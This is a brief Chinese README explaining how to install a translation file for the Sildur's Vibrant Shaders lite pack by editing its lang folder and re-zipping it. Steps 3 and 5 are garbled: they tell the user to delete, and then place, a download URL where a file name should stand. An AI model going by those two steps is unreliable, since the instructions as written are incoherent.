# Sildur-Vibrant-Shaders-lite-汉化

需要做什么？
1. 将光影包解压
2. 打开shaders文件夹，打开lang文件夹
3. 删除https://raw.githubusercontent.com/milkEden/Sildur-Vibrant-Shaders-lite-Translation/main/Culex/Translation_lite_Sildur_Vibrant_Shaders_v1.3.zip
4. 下载https://raw.githubusercontent.com/milkEden/Sildur-Vibrant-Shaders-lite-Translation/main/Culex/Translation_lite_Sildur_Vibrant_Shaders_v1.3.zip
5. 将https://raw.githubusercontent.com/milkEden/Sildur-Vibrant-Shaders-lite-Translation/main/Culex/Translation_lite_Sildur_Vibrant_Shaders_v1.3.zip放入lang文件夹
6. 将整个shaders文件夹压缩成zip
7. 将整个zip放入shaderpacks文件夹
